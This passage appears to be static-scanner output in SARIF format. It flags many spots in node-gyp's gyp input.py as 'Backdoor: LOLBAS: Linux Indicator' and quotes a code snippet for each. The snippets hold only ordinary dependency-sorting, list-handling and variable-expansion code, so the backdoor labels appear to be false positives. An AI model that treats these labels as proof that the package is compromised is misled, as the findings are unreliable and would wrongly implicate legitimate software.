                    "rendered": {
                      "text": "        ValidateRunAsInTarget(target, target_dict, build_file)\n        ValidateActionsInTarget(target, target_dict, build_file)\n\n    # Generators might not expect ints.  Turn them into strs.\n    TurnIntIntoStrInDict(data)\n\n    # TODO(mark): Return |data| for now because the generator needs a list of\n",
                      "markdown": "`        ValidateRunAsInTarget(target, target_dict, build_file)\n        ValidateActionsInTarget(target, target_dict, build_file)\n\n    # Generators might not expect ints.  Turn them into strs.\n    TurnIntIntoStrInDict(data)\n\n    # TODO(mark): Return |data| for now because the generator needs a list of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 3004,
                  "startColumn": 5,
                  "endLine": 3004,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    # set to 1.\n    RemoveSelfDependencies(targets)\n\n    # Expand dependencies specified as build_file:*.\n    ExpandWildcardDependencies(targets, data)\n\n    # Remove all dependencies marked as 'link_dependency' from the targets of\n",
                    "rendered": {
                      "text": "    # set to 1.\n    RemoveSelfDependencies(targets)\n\n    # Expand dependencies specified as build_file:*.\n    ExpandWildcardDependencies(targets, data)\n\n    # Remove all dependencies marked as 'link_dependency' from the targets of\n",
                      "markdown": "`    # set to 1.\n    RemoveSelfDependencies(targets)\n\n    # Expand dependencies specified as build_file:*.\n    ExpandWildcardDependencies(targets, data)\n\n    # Remove all dependencies marked as 'link_dependency' from the targets of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2878,
                  "startColumn": 37,
                  "endLine": 2878,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        target = target.strip()\n        qualified_targets = gyp.common.FindQualifiedTargets(target, flat_list)\n        if not qualified_targets:\n            raise GypError(\"Could not find target %s\" % target)\n        qualified_root_targets.extend(qualified_targets)\n\n    wanted_targets = {}\n",
                    "rendered": {
                      "text": "        target = target.strip()\n        qualified_targets = gyp.common.FindQualifiedTargets(target, flat_list)\n        if not qualified_targets:\n            raise GypError(\"Could not find target %s\" % target)\n        qualified_root_targets.extend(qualified_targets)\n\n    wanted_targets = {}\n",
                      "markdown": "`        target = target.strip()\n        qualified_targets = gyp.common.FindQualifiedTargets(target, flat_list)\n        if not qualified_targets:\n            raise GypError(\"Could not find target %s\" % target)\n        qualified_root_targets.extend(qualified_targets)\n\n    wanted_targets = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2286,
                  "startColumn": 21,
                  "endLine": 2286,
                  "endColumn": 27,
                  "snippet": {
                    "text": "def MergeDicts(to, fro, to_file, fro_file):\n    # I wanted to name the parameter \"from\" but it's a Python keyword...\n    for k, v in fro.items():\n        # It would be nice to do \"if not k in to: to[k] = v\" but that wouldn't give\n        # copy semantics.  Something else may want to merge from the |fro| dict\n        # later, and having the same dict ref pointed to twice in the tree isn't\n        # what anyone wants considering that the dicts may subsequently be\n",
                    "rendered": {
                      "text": "def MergeDicts(to, fro, to_file, fro_file):\n    # I wanted to name the parameter \"from\" but it's a Python keyword...\n    for k, v in fro.items():\n        # It would be nice to do \"if not k in to: to[k] = v\" but that wouldn't give\n        # copy semantics.  Something else may want to merge from the |fro| dict\n        # later, and having the same dict ref pointed to twice in the tree isn't\n        # what anyone wants considering that the dicts may subsequently be\n",
                      "markdown": "`def MergeDicts(to, fro, to_file, fro_file):\n    # I wanted to name the parameter \"from\" but it's a Python keyword...\n    for k, v in fro.items():\n        # It would be nice to do \"if not k in to: to[k] = v\" but that wouldn't give\n        # copy semantics.  Something else may want to merge from the |fro| dict\n        # later, and having the same dict ref pointed to twice in the tree isn't\n        # what anyone wants considering that the dicts may subsequently be\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2160,
                  "startColumn": 61,
                  "endLine": 2160,
                  "endColumn": 67,
                  "snippet": {
                    "text": "                if dependency not in target_dict[\"dependencies\"]:\n                    target_dict[\"dependencies\"].append(dependency)\n            # Sort the dependencies list in the order from dependents to dependencies.\n            # e.g. If A and B depend on C and C depends on D, sort them in A, B, C, D.\n            # Note: flat_list is already sorted in the order from dependencies to\n            # dependents.\n            if sort_dependencies and \"dependencies\" in target_dict:\n",
                    "rendered": {
                      "text": "                if dependency not in target_dict[\"dependencies\"]:\n                    target_dict[\"dependencies\"].append(dependency)\n            # Sort the dependencies list in the order from dependents to dependencies.\n            # e.g. If A and B depend on C and C depends on D, sort them in A, B, C, D.\n            # Note: flat_list is already sorted in the order from dependencies to\n            # dependents.\n            if sort_dependencies and \"dependencies\" in target_dict:\n",
                      "markdown": "`                if dependency not in target_dict[\"dependencies\"]:\n                    target_dict[\"dependencies\"].append(dependency)\n            # Sort the dependencies list in the order from dependents to dependencies.\n            # e.g. If A and B depend on C and C depends on D, sort them in A, B, C, D.\n            # Note: flat_list is already sorted in the order from dependencies to\n            # dependents.\n            if sort_dependencies and \"dependencies\" in target_dict:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2159,
                  "startColumn": 13,
                  "endLine": 2159,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                    target_dict[\"dependencies\"] = []\n                if dependency not in target_dict[\"dependencies\"]:\n                    target_dict[\"dependencies\"].append(dependency)\n            # Sort the dependencies list in the order from dependents to dependencies.\n            # e.g. If A and B depend on C and C depends on D, sort them in A, B, C, D.\n            # Note: flat_list is already sorted in the order from dependencies to\n            # dependents.\n",
                    "rendered": {
                      "text": "                    target_dict[\"dependencies\"] = []\n                if dependency not in target_dict[\"dependencies\"]:\n                    target_dict[\"dependencies\"].append(dependency)\n            # Sort the dependencies list in the order from dependents to dependencies.\n            # e.g. If A and B depend on C and C depends on D, sort them in A, B, C, D.\n            # Note: flat_list is already sorted in the order from dependencies to\n            # dependents.\n",
                      "markdown": "`                    target_dict[\"dependencies\"] = []\n                if dependency not in target_dict[\"dependencies\"]:\n                    target_dict[\"dependencies\"].append(dependency)\n            # Sort the dependencies list in the order from dependents to dependencies.\n            # e.g. If A and B depend on C and C depends on D, sort them in A, B, C, D.\n            # Note: flat_list is already sorted in the order from dependencies to\n            # dependents.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2045,
                  "startColumn": 33,
                  "endLine": 2045,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            root_node.dependents.append(file_node)\n        cycles = []\n        for cycle in root_node.FindCycles():\n            paths = [node.ref for node in cycle]\n            cycles.append(\"Cycle: %s\" % \" -> \".join(paths))\n        raise DependencyGraphNode.CircularException(\n            \"Cycles in .gyp file dependency graph detected:\\n\" + \"\\n\".join(cycles)\n",
                    "rendered": {
                      "text": "            root_node.dependents.append(file_node)\n        cycles = []\n        for cycle in root_node.FindCycles():\n            paths = [node.ref for node in cycle]\n            cycles.append(\"Cycle: %s\" % \" -> \".join(paths))\n        raise DependencyGraphNode.CircularException(\n            \"Cycles in .gyp file dependency graph detected:\\n\" + \"\\n\".join(cycles)\n",
                      "markdown": "`            root_node.dependents.append(file_node)\n        cycles = []\n        for cycle in root_node.FindCycles():\n            paths = [node.ref for node in cycle]\n            cycles.append(\"Cycle: %s\" % \" -> \".join(paths))\n        raise DependencyGraphNode.CircularException(\n            \"Cycles in .gyp file dependency graph detected:\\n\" + \"\\n\".join(cycles)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1983,
                  "startColumn": 33,
                  "endLine": 1983,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n        cycles = []\n        for cycle in root_node.FindCycles():\n            paths = [node.ref for node in cycle]\n            cycles.append(\"Cycle: %s\" % \" -> \".join(paths))\n        raise DependencyGraphNode.CircularException(\n            \"Cycles in dependency graph detected:\\n\" + \"\\n\".join(cycles)\n",
                    "rendered": {
                      "text": "\n        cycles = []\n        for cycle in root_node.FindCycles():\n            paths = [node.ref for node in cycle]\n            cycles.append(\"Cycle: %s\" % \" -> \".join(paths))\n        raise DependencyGraphNode.CircularException(\n            \"Cycles in dependency graph detected:\\n\" + \"\\n\".join(cycles)\n",
                      "markdown": "`\n        cycles = []\n        for cycle in root_node.FindCycles():\n            paths = [node.ref for node in cycle]\n            cycles.append(\"Cycle: %s\" % \" -> \".join(paths))\n        raise DependencyGraphNode.CircularException(\n            \"Cycles in dependency graph detected:\\n\" + \"\\n\".join(cycles)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1850,
                  "startColumn": 27,
                  "endLine": 1850,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n        # It's kind of sucky that |targets| has to be passed into this function,\n        # but that's presently the easiest way to access the target dicts so that\n        # this function can find target types.\n\n        if \"target_name\" not in targets[self.ref]:\n            raise GypError(\"Missing 'target_name' field in target.\")\n",
                    "rendered": {
                      "text": "\n        # It's kind of sucky that |targets| has to be passed into this function,\n        # but that's presently the easiest way to access the target dicts so that\n        # this function can find target types.\n\n        if \"target_name\" not in targets[self.ref]:\n            raise GypError(\"Missing 'target_name' field in target.\")\n",
                      "markdown": "`\n        # It's kind of sucky that |targets| has to be passed into this function,\n        # but that's presently the easiest way to access the target dicts so that\n        # this function can find target types.\n\n        if \"target_name\" not in targets[self.ref]:\n            raise GypError(\"Missing 'target_name' field in target.\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1696,
                  "startColumn": 39,
                  "endLine": 1696,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n            # may now belong in in_degree_zeros.\n            for node_dependent in sorted(node.dependents, key=ExtractNodeRef):\n                is_in_degree_zero = True\n",
                    "rendered": {
                      "text": "            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n            # may now belong in in_degree_zeros.\n            for node_dependent in sorted(node.dependents, key=ExtractNodeRef):\n                is_in_degree_zero = True\n",
                      "markdown": "`            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n            # may now belong in in_degree_zeros.\n            for node_dependent in sorted(node.dependents, key=ExtractNodeRef):\n                is_in_degree_zero = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1693,
                  "startColumn": 11,
                  "endLine": 1693,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n",
                    "rendered": {
                      "text": "            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n",
                      "markdown": "`            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1691,
                  "startColumn": 50,
                  "endLine": 1691,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        while in_degree_zeros:\n            # Nodes in in_degree_zeros have no dependencies not in flat_list, so they\n            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n",
                    "rendered": {
                      "text": "        while in_degree_zeros:\n            # Nodes in in_degree_zeros have no dependencies not in flat_list, so they\n            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n",
                      "markdown": "`        while in_degree_zeros:\n            # Nodes in in_degree_zeros have no dependencies not in flat_list, so they\n            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1679,
                  "startColumn": 43,
                  "endLine": 1679,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        flat_list = OrderedSet()\n\n        def ExtractNodeRef(node):\n            \"\"\"Extracts the object that the node represents from the given node.\"\"\"\n            return node.ref\n\n        # in_degree_zeros is the list of DependencyGraphNodes that have no\n",
                    "rendered": {
                      "text": "        flat_list = OrderedSet()\n\n        def ExtractNodeRef(node):\n            \"\"\"Extracts the object that the node represents from the given node.\"\"\"\n            return node.ref\n\n        # in_degree_zeros is the list of DependencyGraphNodes that have no\n",
                      "markdown": "`        flat_list = OrderedSet()\n\n        def ExtractNodeRef(node):\n            \"\"\"Extracts the object that the node represents from the given node.\"\"\"\n            return node.ref\n\n        # in_degree_zeros is the list of DependencyGraphNodes that have no\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1563,
                  "startColumn": 67,
                  "endLine": 1563,
                  "endColumn": 73,
                  "snippet": {
                    "text": "                    )\n\n                # Take the wildcard out and adjust the index so that the next\n                # dependency in the list will be processed the next time through the\n                # loop.\n                del dependencies[index]\n                index = index - 1\n",
                    "rendered": {
                      "text": "                    )\n\n                # Take the wildcard out and adjust the index so that the next\n                # dependency in the list will be processed the next time through the\n                # loop.\n                del dependencies[index]\n                index = index - 1\n",
                      "markdown": "`                    )\n\n                # Take the wildcard out and adjust the index so that the next\n                # dependency in the list will be processed the next time through the\n                # loop.\n                del dependencies[index]\n                index = index - 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1524,
                  "startColumn": 26,
                  "endLine": 1524,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  is taken as a wildcard link, and is expanded to list each target in\n  build_file.  The |data| dict provides access to build file dicts.\n\n  Any target that does not wish to be included by wildcard can provide an\n  optional \"suppress_wildcard\" key in its target dict.  When present and\n  true, a wildcard dependency link will not include such targets.\n\n",
                    "rendered": {
                      "text": "  is taken as a wildcard link, and is expanded to list each target in\n  build_file.  The |data| dict provides access to build file dicts.\n\n  Any target that does not wish to be included by wildcard can provide an\n  optional \"suppress_wildcard\" key in its target dict.  When present and\n  true, a wildcard dependency link will not include such targets.\n\n",
                      "markdown": "`  is taken as a wildcard link, and is expanded to list each target in\n  build_file.  The |data| dict provides access to build file dicts.\n\n  Any target that does not wish to be included by wildcard can provide an\n  optional \"suppress_wildcard\" key in its target dict.  When present and\n  true, a wildcard dependency link will not include such targets.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1242,
                  "startColumn": 13,
                  "endLine": 1242,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        )\n\n        if merge_dict is not None:\n            # Expand variables and nested conditinals in the merge_dict before\n            # merging it.\n            ProcessVariablesAndConditionsInDict(\n                merge_dict, phase, variables, build_file\n",
                    "rendered": {
                      "text": "        )\n\n        if merge_dict is not None:\n            # Expand variables and nested conditinals in the merge_dict before\n            # merging it.\n            ProcessVariablesAndConditionsInDict(\n                merge_dict, phase, variables, build_file\n",
                      "markdown": "`        )\n\n        if merge_dict is not None:\n            # Expand variables and nested conditinals in the merge_dict before\n            # merging it.\n            ProcessVariablesAndConditionsInDict(\n                merge_dict, phase, variables, build_file\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1181,
                  "startColumn": 7,
                  "endLine": 1181,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        else:\n            ast_code = compile(cond_expr_expanded, \"<string>\", \"eval\")\n            cached_conditions_asts[cond_expr_expanded] = ast_code\n        env = {\"__builtins__\": {}, \"v\": Version}\n        if eval(ast_code, env, variables):\n            return true_dict\n        return false_dict\n",
                    "rendered": {
                      "text": "        else:\n            ast_code = compile(cond_expr_expanded, \"<string>\", \"eval\")\n            cached_conditions_asts[cond_expr_expanded] = ast_code\n        env = {\"__builtins__\": {}, \"v\": Version}\n        if eval(ast_code, env, variables):\n            return true_dict\n        return false_dict\n",
                      "markdown": "`        else:\n            ast_code = compile(cond_expr_expanded, \"<string>\", \"eval\")\n            cached_conditions_asts[cond_expr_expanded] = ast_code\n        env = {\"__builtins__\": {}, \"v\": Version}\n        if eval(ast_code, env, variables):\n            return true_dict\n        return false_dict\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1036,
                  "startColumn": 24,
                  "endLine": 1036,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            raise GypError(\n                \"Variable \"\n                + contents\n                + \" must expand to a string or list of strings; \"\n                + \"found a \"\n                + replacement.__class__.__name__\n            )\n",
                    "rendered": {
                      "text": "            raise GypError(\n                \"Variable \"\n                + contents\n                + \" must expand to a string or list of strings; \"\n                + \"found a \"\n                + replacement.__class__.__name__\n            )\n",
                      "markdown": "`            raise GypError(\n                \"Variable \"\n                + contents\n                + \" must expand to a string or list of strings; \"\n                + \"found a \"\n                + replacement.__class__.__name__\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1022,
                  "startColumn": 32,
                  "endLine": 1022,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                    raise GypError(\n                        \"Variable \"\n                        + contents\n                        + \" must expand to a string or list of strings; \"\n                        + \"list contains a \"\n                        + item.__class__.__name__\n                    )\n",
                    "rendered": {
                      "text": "                    raise GypError(\n                        \"Variable \"\n                        + contents\n                        + \" must expand to a string or list of strings; \"\n                        + \"list contains a \"\n                        + item.__class__.__name__\n                    )\n",
                      "markdown": "`                    raise GypError(\n                        \"Variable \"\n                        + contents\n                        + \" must expand to a string or list of strings; \"\n                        + \"list contains a \"\n                        + item.__class__.__name__\n                    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 909,
                  "startColumn": 64,
                  "endLine": 909,
                  "endColumn": 70,
                  "snippet": {
                    "text": "            # run as well as the directory to run it from, to account for commands\n            # that depend on their current directory.\n            # TODO(http://code.google.com/p/gyp/issues/detail?id=111): In theory,\n            # someone could author a set of GYP files where each time the command\n            # is invoked it produces different output by design. When the need\n            # arises, the syntax should be extended to support no caching off a\n            # command's output so it is run every time.\n",
                    "rendered": {
                      "text": "            # run as well as the directory to run it from, to account for commands\n            # that depend on their current directory.\n            # TODO(http://code.google.com/p/gyp/issues/detail?id=111): In theory,\n            # someone could author a set of GYP files where each time the command\n            # is invoked it produces different output by design. When the need\n            # arises, the syntax should be extended to support no caching off a\n            # command's output so it is run every time.\n",
                      "markdown": "`            # run as well as the directory to run it from, to account for commands\n            # that depend on their current directory.\n            # TODO(http://code.google.com/p/gyp/issues/detail?id=111): In theory,\n            # someone could author a set of GYP files where each time the command\n            # is invoked it produces different output by design. When the need\n            # arises, the syntax should be extended to support no caching off a\n            # command's output so it is run every time.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 858,
                  "startColumn": 13,
                  "endLine": 858,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        expand_to_list = \"@\" in match[\"type\"] and input_str == replacement\n\n        if run_command or file_list:\n            # Find the build file's directory, so commands can be run or file lists\n            # generated relative to it.\n            build_file_dir = os.path.dirname(build_file)\n            if build_file_dir == \"\" and not file_list:\n",
                    "rendered": {
                      "text": "        expand_to_list = \"@\" in match[\"type\"] and input_str == replacement\n\n        if run_command or file_list:\n            # Find the build file's directory, so commands can be run or file lists\n            # generated relative to it.\n            build_file_dir = os.path.dirname(build_file)\n            if build_file_dir == \"\" and not file_list:\n",
                      "markdown": "`        expand_to_list = \"@\" in match[\"type\"] and input_str == replacement\n\n        if run_command or file_list:\n            # Find the build file's directory, so commands can be run or file lists\n            # generated relative to it.\n            build_file_dir = os.path.dirname(build_file)\n            if build_file_dir == \"\" and not file_list:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 842,
                  "startColumn": 24,
                  "endLine": 842,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, variables, build_file)\n\n        # Strip off leading/trailing whitespace so that variable matches are\n",
                    "rendered": {
                      "text": "            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, variables, build_file)\n\n        # Strip off leading/trailing whitespace so that variable matches are\n",
